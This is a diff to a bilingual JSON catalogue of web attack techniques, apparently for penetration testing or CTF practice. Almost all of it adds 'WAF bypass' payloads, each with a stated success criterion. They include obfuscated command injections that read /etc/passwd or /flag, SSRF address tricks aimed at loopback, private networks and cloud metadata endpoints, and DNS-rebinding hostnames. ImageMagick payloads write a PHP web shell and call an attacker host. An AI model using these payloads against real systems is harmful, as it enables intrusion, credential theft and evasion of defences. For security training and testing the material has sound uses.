@@ -42,8 +42,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "Shell 分隔符探测",
-        "en": "Shell Separator Probing"
+        "zh": "命令注入",
+        "en": "Command Injection"
       },
       "tutorial": {
         "overview": {
@@ -127,7 +127,42 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "反引号替换执行",
+            "en": "Backtick Substitution Execution"
+          },
+          "command": "`cat /etc/passwd`",
+          "description": {
+            "zh": "绕过对 ;、|、& 等分隔符特征的拦截：用反引号命令替换直接嵌套执行；成功判据：响应中出现 root:x:0:0 回显。",
+            "en": "Bypasses WAF rules matching separator characters like ;, | and &: embeds the command via backtick substitution. Success: response echoes root:x:0:0."
+          }
+        },
+        {
+          "title": {
+            "zh": "$() 命令替换执行",
+            "en": "$() Command Substitution"
+          },
+          "command": "$(cat /etc/passwd)",
+          "description": {
+            "zh": "绕过基于分隔符与反引号的规则：使用 POSIX 命令替换语法；成功判据：文件内容回显或与 `id` 输出对比可辨识。",
+            "en": "Evades rules keying on separators or backticks by using POSIX command substitution. Success: file contents appear in the response."
+          }
+        },
+        {
+          "title": {
+            "zh": "URL 编码换行注入",
+            "en": "URL-Encoded Newline Injection"
+          },
+          "command": "%0Acat%20/etc/passwd",
+          "description": {
+            "zh": "绕过仅匹配 %0d%0a 或明文分隔符的 WAF：单独使用 %0A 换行后接 URL 编码命令；成功判据：服务端执行换行后的命令并回显。",
+            "en": "Bypasses WAFs matching only %0d%0a or plaintext separators: uses a lone %0A newline followed by a URL-encoded command. Success: server executes the line after the newline."
+          }
+        }
+      ]
     },
     {
       "id": "cmdi2-ifs",
@@ -284,8 +319,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "引号令牌重组",
-        "en": "Quote-Based Token Reassembly"
+        "zh": "命令注入",
+        "en": "Command Injection"
       },
       "tutorial": {
         "overview": {
@@ -359,7 +394,42 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "空变量拼接命令名",
+            "en": "Empty Variable Token Splicing"
+          },
+          "command": "c\"\"at$IFS$9/flag",
+          "description": {
+            "zh": "绕过对完整命令名 cat 与空格的检测：空引号拆分命令名、$IFS 与空位置参数 $9 代替空格；成功判据：flag 内容回显。",
+            "en": "Evades detection of the literal command name and whitespace: empty quotes split the command, $IFS and $9 replace spaces. Success: flag content is returned."
+          }
+        },
+        {
+          "title": {
+            "zh": "双段引号重组",
+            "en": "Two-Segment Quote Reassembly"
+          },
+          "command": "ca\"\"t${IFS}/fl\"\"ag",
+          "description": {
+            "zh": "命令名与路径都做引号拆分，绕过整串黑名单匹配；成功判据：/flag 文件内容出现在响应。",
+            "en": "Splits both the command name and the path with quote pairs to defeat whole-string blacklists. Success: /flag contents appear in the response."
+          }
+        },
+        {
+          "title": {
+            "zh": "反引号内引号混淆",
+            "en": "Quotes Inside Backticks"
+          },
+          "command": "`ca''t /flag`",
+          "description": {
+            "zh": "外层反引号执行、内层空引号拆分，双重规避分隔符与命令名特征；成功判据：返回 flag 内容。",
+            "en": "Combines backtick execution with inner quote-splitting to evade both separator and command-name signatures. Success: flag content returned."
+          }
+        }
+      ]
     },
     {
       "id": "cmdi2-hex",
@@ -400,8 +470,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "十六进制解码与命令替换",
-        "en": "Hex Decoding and Command Substitution"
+        "zh": "命令注入",
+        "en": "Command Injection"
       },
       "tutorial": {
         "overview": {
@@ -476,7 +546,42 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "八进制转义重组",
+            "en": "Octal Escape Reassembly"
+          },
+          "command": "$(printf '\\154\\163\\040\\057')",
+          "description": {
+            "zh": "绕过针对 \\x 十六进制特征的规则：改用八进制转义构造命令字符；成功判据：执行 ls / 并回显目录列表。",
+            "en": "Evades rules keying on \\x hex escapes by rebuilding the command with octal escapes. Success: ls / output is reflected."
+          }
+        },
+        {
+          "title": {
+            "zh": "ANSI-C 引价执行",
+            "en": "ANSI-C Quoting Execution"
+          },
+          "command": "$'\\x63\\x61\\x74' ${IFS}/flag",
+          "description": {
+            "zh": "用 bash $'' ANSI-C 引用把十六进制还原成命令名，避开 $(printf) 组合特征；成功判据：flag 内容回显。",
+            "en": "Uses bash $'' ANSI-C quoting to materialize the command from hex, avoiding the $(printf) pattern. Success: flag content echoed."
+          }
+        },
+        {
+          "title": {
+            "zh": "xxd 十六进制还原",
+            "en": "xxd Hex Restoration"
+          },
+          "command": "$(echo 636174202f666c6167|xxd -r -p)",
+          "description": {
+            "zh": "绕过 printf/base64 关键词检测：用 xxd -r -p 还原十六进制命令字符串执行；成功判据：命令输出回显。",
+            "en": "Avoids printf/base64 keyword rules by restoring the hex payload with xxd -r -p. Success: command output is reflected."
+          }
+        }
+      ]
     },
     {
       "id": "cmdi2-base64",
@@ -517,8 +622,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "Base64 解码与命令替换",
-        "en": "Base64 Decoding and Command Substitution"
+        "zh": "命令注入",
+        "en": "Command Injection"
       },
       "tutorial": {
         "overview": {
@@ -593,7 +698,42 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "here-string 解码执行",
+            "en": "Here-String Decode Execution"
+          },
+          "command": "`base64 -d <<<Y2F0IC9mbGFn`",
+          "description": {
+            "zh": "绕过匹配 echo|base64 管道的规则：用 here-string 传参给 base64；成功判据：命令执行且 flag 回显。",
+            "en": "Evades rules matching echo|base64 pipes by feeding base64 via here-string. Success: command runs and flag is reflected."
+          }
+        },
+        {
+          "title": {
+            "zh": "rev 反转执行",
+            "en": "rev Reversal Execution"
+          },
+          "command": "$(echo 'galf/tac tac' | rev | sh)",
+          "description": {
+            "zh": "绕过对 base64 关键字本身的拦截：rev 反转字符串后交给 sh；成功判据：目标命令被执行（可用延时验证）。",
+            "en": "Bypasses blocking of the base64 keyword itself: reverses the string and pipes to sh. Success: target command executes (verify with a delay)."
+          }
+        },
+        {
+          "title": {
+            "zh": "openssl 解码执行",
+            "en": "openssl Decode Execution"
+          },
+          "command": "$(echo Y2F0IC9mbGFn|openssl enc -base64 -d)",
+          "description": {
+            "zh": "用 openssl 代替 base64 命令完成解码，规避 base64 特征；成功判据：命令输出回显。",
+            "en": "Uses openssl instead of the base64 binary to decode, evading base64 signatures. Success: command output reflected."
+          }
+        }
+      ]
     },
     {
       "id": "cmdi2-url",
@@ -999,8 +1139,8 @@
         "en": "SSRF Server-Side Request Forgery"
       },
       "subCategory": {
-        "zh": "回环服务端口探测",
-        "en": "Loopback Service-Port Probing"
+        "zh": "回环与内网探测",
+        "en": "Loopback & Internal Network Probing"
       },
       "tutorial": {
         "overview": {
@@ -1082,7 +1222,42 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "八进制回环变形",
+            "en": "Octal Loopback Mutation"
+          },
+          "command": "http://0177.0.0.1:8080/\nhttp://0177.0000.0000.0001:443",
+          "description": {
+            "zh": "绕过对 127.0.0.1 十进制字面量的黑名单：八进制表示解析后等价；内部端口响应差异出现即成功。",
+            "en": "Represent the loopback octally to defeat decimal blacklists; a differing response from the internal port confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "IPv4 映射 IPv6",
+            "en": "IPv4-Mapped IPv6"
+          },
+          "command": "http://[::ffff:127.0.0.1]:8080/\nhttp://[::ffff:7f00:1]:6379",
+          "description": {
+            "zh": "绕过对 IPv4 与 IPv6 分开的规则：用映射地址跨界；连接内网服务成功即成功。",
+            "en": "Cross the v4/v4-mapped boundary against separated rule sets; a successful connection to the internal service confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "短格式回环",
+            "en": "Short-Form Loopback"
+          },
+          "command": "http://127.1:8080/\nhttp://127.0.1:3306",
+          "description": {
+            "zh": "绕过完整四段地址匹配：缩写形式展开后仍为回环；端口指纹可辨即成功。",
+            "en": "Use abbreviated forms that expand to the loopback past full four-octet matching; a recognizable port fingerprint confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "cmdi2-ip-ext",
@@ -1456,8 +1631,8 @@
         "en": "SSRF Server-Side Request Forgery"
       },
       "subCategory": {
-        "zh": "私网目标 SSRF 探测",
-        "en": "Private-Network SSRF Probing"
+        "zh": "回环与内网探测",
+        "en": "Loopback & Internal Network Probing"
       },
       "tutorial": {
         "overview": {
@@ -1539,7 +1714,42 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "整数型私网地址",
+            "en": "Integer Private Address"
+          },
+          "command": "http://3232235521/\nhttp://167772161/",
+          "description": {
+            "zh": "绕过对点分十进制私网段规则：192.168.0.1 与 10.0.0.1 转为 32 位整数；内网网关页面返回即成功。",
+            "en": "Convert private ranges to 32-bit integers past dotted-decimal rules; an internal gateway page returning confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "十六进制私网地址",
+            "en": "Hexadecimal Private Address"
+          },
+          "command": "http://0xC0A80001/\nhttp://0x0A000001/",
+          "description": {
+            "zh": "绕过对十进制私网黑名单：十六进制表示同一目标；服务响应差异出现即成功。",
+            "en": "Represent the same targets hexadecimally against decimal blacklists; a differing service response confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "IPv6 映射私网段",
+            "en": "IPv6-Mapped Private Range"
+          },
+          "command": "http://[::ffff:c0a8:1]/\nhttp://[::ffff:10.0.0.1]/",
+          "description": {
+            "zh": "绕过按地址族分别过滤的规则：以映射形式访问私网；内网服务可达即成功。",
+            "en": "Access private ranges in mapped form against per-family filtering; the internal service being reachable confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "cmdi2-web-attack-cheat-sheet-7",
@@ -1874,8 +2084,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "解码到 Shell 管道",
-        "en": "Decode-to-Shell Pipeline"
+        "zh": "命令注入",
+        "en": "Command Injection"
       },
       "tutorial": {
         "overview": {
@@ -2004,8 +2214,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "变量展开令牌重组",
-        "en": "Variable-Expansion Token Reassembly"
+        "zh": "命令注入",
+        "en": "Command Injection"
       },
       "tutorial": {
         "overview": {
@@ -2265,8 +2475,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "复合 Shell 语法注入",
-        "en": "Composite Shell-Syntax Injection"
+        "zh": "命令注入",
+        "en": "Command Injection"
       },
       "tutorial": {
         "overview": {
@@ -2355,6 +2565,41 @@
       "tags": [
         "cmdi2",
         "command_separators"
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "IFS 空格替代组合",
+            "en": "IFS Whitespace Substitute Combo"
+          },
+          "command": ";cat${IFS}/etc/passwd",
+          "description": {
+            "zh": "绕过对“分隔符+空格+命令”结构的规则：$IFS 代替空格保持 token 完整；成功判据：passwd 内容回显。",
+            "en": "Evades rules matching separator+space+command by replacing spaces with $IFS. Success: passwd contents reflected."
+          }
+        },
+        {
+          "title": {
+            "zh": "Tab 编码注入",
+            "en": "Tab-Encoded Injection"
+          },
+          "command": "%0Ac'a't%09/etc/passwd",
+          "description": {
+            "zh": "换行后用 %09 tab 分隔，配合引号拆分规避多特征组合检测；成功判据：文件内容回显。",
+            "en": "Uses a %09 tab after newline plus quote-splitting to evade composite signatures. Success: file contents reflected."
+          }
+        },
+        {
+          "title": {
+            "zh": "换行加解码执行",
+            "en": "Newline Plus Decode Execution"
+          },
+          "command": "%0a$(printf '\\151\\144')",
+          "description": {
+            "zh": "换行接八进制还原的命令，绕过分隔符与命令名双重检测；成功判据：id 输出回显。",
+            "en": "Newline followed by an octal-restored command, defeating both separator and command-name detection. Success: id output reflected."
+          }
+        }
       ]
     },
     {
@@ -2592,8 +2837,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "PHP disable_functions 逃逸",
-        "en": "PHP disable_functions escape"
+        "zh": "代码执行与函数滥用",
+        "en": "Code Execution & Function Abuse"
       },
       "tutorial": {
         "overview": {
@@ -2723,8 +2968,8 @@
         "en": "RCE Remote Code Execution"
       },
       "subCategory": {
-        "zh": "ImageMagick MVG 注入",
-        "en": "ImageMagick MVG Injection"
+        "zh": "组件与服务 RCE",
+        "en": "Component & Service RCE"
       },
       "tutorial": {
         "overview": {
@@ -2808,7 +3053,42 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "MSL 载体变体",
+            "en": "MSL Carrier Variant"
+          },
+          "command": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<image>\n<read filename=\"image.jpg\"/>\n<write filename=\"shell.php\"/>\n<?php system($_GET['cmd']); ?>\n</image>",
+          "description": {
+            "zh": "绕过对 MVG push graphic-context 特征的拦截：改用 MSL(XML) 形态直接写 WebShell 文件；成功判据：目标目录生成 shell.php。",
+            "en": "Evades MVG push graphic-context signatures by using the MSL (XML) form to write a shell file directly. Success: shell.php appears in the target directory."
+          }
+        },
+        {
+          "title": {
+            "zh": "image over 委托变体",
+            "en": "image over Delegate Variant"
+          },
+          "command": "push graphic-context\nviewbox 0 0 640 480\nimage over 0,0 0,0 'ephemeral:|id'\npop graphic-context",
+          "description": {
+            "zh": "用 image over 原语加 ephemeral: 协议触发委托命令，绕过 fill url() 检测；成功判据：处理报错或日志含命令执行痕迹。",
+            "en": "Uses the image over primitive with ephemeral: to trigger the delegate, evading fill url() detection. Success: errors or logs show command execution traces."
+          }
+        },
+        {
+          "title": {
+            "zh": "SVG 载体变形",
+            "en": "SVG Carrier Mutation"
+          },
+          "command": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<image xlink:href=\"https://{ATTACKER_HOST}/x.png&#124;id&#32;-la\"/>\n</svg>",
+          "description": {
+            "zh": "以 SVG 上传为载体并用 XML 实体编码 | 与空格，规避 MVG 关键词与明文管道符检测；成功判据：SVG 被处理时触发外联或命令执行。",
+            "en": "Uses an SVG upload carrier with XML entity-encoded pipe and space to evade MVG keyword and plaintext pipe detection. Success: outbound fetch or command execution occurs when the SVG is processed."
+          }
+        }
+      ]
     },
     {
       "id": "cmdi2-cloud-metadata-endpoints-6-pla",
@@ -2849,8 +3129,8 @@
         "en": "SSRF Server-Side Request Forgery"
       },
       "subCategory": {
-        "zh": "云元数据端点访问",
-        "en": "Cloud Metadata Endpoint Access"
+        "zh": "云元数据获取",
+        "en": "Cloud Metadata Access"
       },
       "tutorial": {
         "overview": {
@@ -2934,7 +3214,42 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "整数地址元数据端点",
+            "en": "Integer-Address Metadata Endpoint"
+          },
+          "command": "http://2852039662/latest/meta-data/\nhttp://2852039662/latest/user-data/",
+          "description": {
+            "zh": "绕过对 169.254.169.254 明文黑名单：链路本地地址转 32 位整数；返回 IAM 角色信息即成功。",
+            "en": "Convert the link-local metadata address to an integer past plaintext blacklists; returned IAM role information confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "尾点域名解析",
+            "en": "Trailing-Dot Hostname Resolution"
+          },
+          "command": "http://metadata.google.internal./computeMetadata/v1/instance/",
+          "description": {
+            "zh": "绕过对无尾点主机名的精确匹配：加尾点后 DNS 等价解析；带 Header 请求返回实例元数据即成功。",
+            "en": "Append the DNS-equivalent trailing dot past exact hostname matching; a Header-bearing request returning instance metadata confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "多云备用端点轮换",
+            "en": "Alternate Multi-Cloud Endpoints"
+          },
+          "command": "http://100.100.100.200/latest/meta-data/\nhttp://192.0.0.192/latest/",
+          "description": {
+            "zh": "绕过对 AWS 标准元数据地址的单点封禁：轮换阿里云/Oracle 等备用元数据端点；任一返回实例信息即成功。",
+            "en": "Rotate alternate cloud metadata endpoints past AWS-specific blocking; any endpoint returning instance information confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "cmdi2-ssrf-bypass-techniques",
@@ -3261,8 +3576,8 @@
         "en": "SSRF Server-Side Request Forgery"
       },
       "subCategory": {
-        "zh": "公共 Rebinding 域名探测",
-        "en": "Public Rebinding-Domain Probing"
+        "zh": "地址变形与 DNS 解析绕过",
+        "en": "Address Obfuscation & DNS Bypass"
       },
       "tutorial": {
         "overview": {
@@ -3345,7 +3660,42 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "地址段顺序对调",
+            "en": "Swapped Address Segments"
+          },
+          "command": "http://a9fea9fe.7f000001.rbndr.us/\nhttp://c0a80101.7f000001.rbndr.us/",
+          "description": {
+            "zh": "绕过对固定顺序十六进制段的匹配：前后地址对调后服务在两次解析间切换目标；两次请求源 IP 不同即重绑定生效。",
+            "en": "Swap the hex segments so resolution alternates between two targets past fixed-order matching; differing source IPs across requests confirm rebinding."
+          }
+        },
+        {
+          "title": {
+            "zh": "混入零地址段",
+            "en": "Zero-Segment Mixing"
+          },
+          "command": "http://7f000001.00000000.rbndr.us/",
+          "description": {
+            "zh": "绕过只监控私网目标段的规则：一侧置零地址观察解析行为；DNS 应答在两值间变化即成功。",
+            "en": "Set one side to the zero address against private-range-only monitoring; DNS answers alternating between the two values confirm success."
+          }
+        },
+        {
+          "title": {
+            "zh": "附加端口探测链",
+            "en": "Ported Probe Chain"
+          },
+          "command": "http://7f000001.a9fea9fe.rbndr.us:8080/\nhttp://7f000001.a9fea9fe.rbndr.us:6379/",
+          "description": {
+            "zh": "绕过对默认端口形态的检测：在重绑定域名上直接挂端口扫描；端口开放差异响应可辨即成功。",
+            "en": "Attach port probes directly to the rebinding domain against default-port assumptions; distinguishable open/closed responses confirm success."
+          }
+        }
+      ]
     },
     {
       "id": "cmdi2-nip-io-dns",
@@ -3386,8 +3736,8 @@
         "en": "SSRF Server-Side Request Forgery"
       },
       "subCategory": {
-        "zh": "nip.io 通配 DNS 解析",
-        "en": "nip.io Wildcard-DNS Resolution"
+        "zh": "地址变形与 DNS 解析绕过",
+        "en": "Address Obfuscation & DNS Bypass"
       },
       "tutorial": {
         "overview": {
@@ -3470,7 +3820,42 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "短横线分隔形式",
+            "en": "Dash-Separated Form"
+          },
+          "command": "http://127-0-0-1.nip.io/\nhttp://169-254-169-254.nip.io/",
+          "description": {
+            "zh": "绕过对点分嵌入 nip.io 形式的匹配：短横线形式解析等价；内网服务响应出现即成功。",
+            "en": "Use the dash form that resolves identically past dotted-embedding matching; an internal service response appearing confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "大写域名变形",
+            "en": "Uppercase Domain Mutation"
+          },
+          "command": "http://169.254.169.254.NIP.IO/",
+          "description": {
+            "zh": "绕过对全小写通配域名的规则：域名部分大写，DNS 不区分大小写；元数据返回即成功。",
+            "en": "Uppercase the domain against lowercase wildcard rules since DNS is case-insensitive; returned metadata confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "前缀子域伪装",
+            "en": "Prefix Subdomain Camouflage"
+          },
+          "command": "http://api.169.254.169.254.nip.io/\nhttp://internal.10.0.0.1.nip.io/",
+          "description": {
+            "zh": "绕过对\"IP 开头域名\"直接判定的过滤：加业务风格前缀子域；解析仍指向目标地址即成功。",
+            "en": "Prepend a business-style subdomain so the hostname no longer starts with an IP; resolution still pointing at the target confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "cmdi2-sslip-io-dns",
@@ -3511,8 +3896,8 @@
         "en": "SSRF Server-Side Request Forgery"
       },
       "subCategory": {
-        "zh": "sslip.io 通配 DNS 解析",
-        "en": "sslip.io Wildcard-DNS Resolution"
+        "zh": "地址变形与 DNS 解析绕过",
+        "en": "Address Obfuscation & DNS Bypass"
       },
       "tutorial": {
         "overview": {
@@ -3595,7 +3980,42 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "短横线等价形式",
+            "en": "Dash-Equivalent Form"
+          },
+          "command": "http://192-168-1-1.sslip.io/\nhttp://10-0-0-1.sslip.io/",
+          "description": {
+            "zh": "绕过对点分 sslip.io 形式特征的匹配：短横线写法等价解析；内网设备页面返回即成功。",
+            "en": "Use the dash notation that resolves identically past dotted-form signatures; an internal device page returning confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "十六进制地址形式",
+            "en": "Hex Address Form"
+          },
+          "command": "http://7f000001.sslip.io/\nhttp://a9fea9fe.sslip.io/",
+          "description": {
+            "zh": "绕过对十进制 IP 段的规则：十六进制形式同样被通配解析；目标端口响应差异可辨即成功。",
+            "en": "Use hex forms still matched by the wildcard against decimal-range rules; distinguishable target port responses confirm success."
+          }
+        },
+        {
+          "title": {
+            "zh": "混合分隔符形式",
+            "en": "Mixed-Separator Form"
+          },
+          "command": "http://192.168.001.001.sslip.io/",
+          "description": {
+            "zh": "绕过对紧凑十进制匹配：补零形式解析等价；网关管理页可达即成功。",
+            "en": "Use zero-padded forms that resolve identically against compact decimal matching; a reachable gateway admin page confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "cmdi2-1u-ms-dns",
@@ -3636,8 +4056,8 @@
         "en": "SSRF Server-Side Request Forgery"
       },
       "subCategory": {
-        "zh": "编码地址通配 DNS",
-        "en": "Encoded-Address Wildcard DNS"
+        "zh": "地址变形与 DNS 解析绕过",
+        "en": "Address Obfuscation & DNS Bypass"
       },
       "tutorial": {
         "overview": {
@@ -3720,7 +4140,42 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "双目标连续切换",
+            "en": "Dual-Target Sequential Switching"
+          },
+          "command": "http://make-127-0-0-1-and-169-254-169-254-rr.1u.ms/",
+          "description": {
+            "zh": "绕过对单一 make 前缀模式的检测：一条域名在两地址间轮转解析；两次请求命中不同目标即成功。",
+            "en": "Rotate resolution between two addresses within one domain past single-prefix detection; two requests hitting different targets confirm success."
+          }
+        },
+        {
+          "title": {
+            "zh": "十六进制构造形式",
+            "en": "Hex Construction Form"
+          },
+          "command": "http://make-0x7f000001-rr.1u.ms/\nhttp://make-0xa9fea9fe-rr.1u.ms/",
+          "description": {
+            "zh": "绕过对十进制短横线形式的规则：十六进制构造同样被解析；回环/元数据内容返回即成功。",
+            "en": "Build targets hexadecimally, still parsed by the service, against dash-decimal rules; loopback or metadata content returning confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "userinfo 域名前置",
+            "en": "Userinfo Domain Prefixing"
+          },
+          "command": "http://cdn.example.com@make-127-0-0-1-rr.1u.ms/",
+          "description": {
+            "zh": "绕过对域名整体形态的判断：userinfo 段伪装成 CDN 域名，实际主机仍为 1u.ms；目标解析并连接成功即成功。",
+            "en": "Disguise a decoy CDN in userinfo while the real host stays 1u.ms; successful target resolution and connection confirm success."
+          }
+        }
+      ]
     },
     {
       "id": "cmdi2-localtest-me",
@@ -3761,8 +4216,8 @@
         "en": "SSRF Server-Side Request Forgery"
       },
       "subCategory": {
-        "zh": "回环别名域名解析",
-        "en": "Loopback Alias-Domain Resolution"
+        "zh": "回环与内网探测",
+        "en": "Loopback & Internal Network Probing"
       },
       "tutorial": {
         "overview": {
@@ -3844,7 +4299,42 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "携带路径元数据探测",
+            "en": "Path-Bearing Metadata Probe"
+          },
+          "command": "http://localtest.me:8080/\nhttp://localtest.me/latest/meta-data/",
+          "description": {
+            "zh": "绕过对回环别名域名的端口形态限制：直接携带内部路径探测；元数据或服务响应返回即成功。",
+            "en": "Carry internal paths on the loopback alias past port-form assumptions; metadata or service responses returning confirm success."
+          }
+        },
+        {
+          "title": {
+            "zh": "大小写与尾点变形",
+            "en": "Case and Trailing-Dot Mutation"
+          },
+          "command": "http://LOCALTEST.ME:6379/\nhttp://localtest.me.:3306/",
+          "description": {
+            "zh": "绕过对全小写无尾点域名的精确匹配：大小写与尾点均不影响解析；端口指纹差异可辨即成功。",
+            "en": "Mutate case and append the trailing dot without affecting resolution; distinguishable port fingerprints confirm success."
+          }
+        },
+        {
+          "title": {
+            "zh": "IPv6 本机别名",
+            "en": "IPv6 Localhost Alias"
+          },
+          "command": "http://ip6-localhost:8080/\nhttp://[::1]:8080/",
+          "description": {
+            "zh": "绕过仅覆盖 IPv4 别名的规则：改用系统 IPv6 本机别名解析；服务可达即成功。",
+            "en": "Resolve via the system IPv6 localhost alias against IPv4-only coverage; the service being reachable confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "cmdi2-ttl-0",
@@ -3885,8 +4375,8 @@
         "en": "SSRF Server-Side Request Forgery"
       },
       "subCategory": {
-        "zh": "DNS TOCTOU Rebinding",
-        "en": "DNS TOCTOU Rebinding"
+        "zh": "地址变形与 DNS 解析绕过",
+        "en": "Address Obfuscation & DNS Bypass"
       },
       "tutorial": {
         "overview": {
@@ -3969,7 +4459,42 @@
           "added-authoritative-references",
           "defined-success-and-false-positive-evidence"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "多记录轮询解析",
+            "en": "Round-Robin Multi-Record Resolution"
+          },
+          "command": "http://rebind.{LAB_OAST}/  # A 记录: 外网IP + 内网IP 各一条",
+          "description": {
+            "zh": "绕过对单条 A 记录缓存的有效性检查：多条记录轮询使两次连接命中不同地址；外部校验请求与内部请求均出现即成功。",
+            "en": "Publish two A records so round-robin lands successive connections on different addresses; both an external validation hit and an internal request confirm success."
+          }
+        },
+        {
+          "title": {
+            "zh": "端口分流的解析切换",
+            "en": "Port-Partitioned Resolution Switch"
+          },
+          "command": "http://rebind.{LAB_OAST}:8080/\nhttp://rebind.{LAB_OAST}:6379/",
+          "description": {
+            "zh": "绕过对单端口探测的判定：不同端口分别触发解析时机差；一端口先出网校验另一端口命中内网即成功。",
+            "en": "Probe different ports to shift resolution timing; one port validating out-of-band first while another hits the internal target confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "纯 DNS 通道翻转",
+            "en": "DNS-Only Channel Flip"
+          },
+          "command": "nslookup rebind.{LAB_OAST}  # TTL=0，两次查询返回 127.0.0.1 与外部IP 交替",
+          "description": {
+            "zh": "绕过 HTTP 层的出网记录：仅用 DNS 查询验证低 TTL 翻转行为；两次应答 IP 不同即重绑定能力成立。",
+            "en": "Validate the low-TTL flip through DNS queries alone; alternating answers across two queries confirm rebinding capability."
+          }
+        }
+      ]
     },
     {
       "id": "cmdi2-dns-rebinding-ssrf",
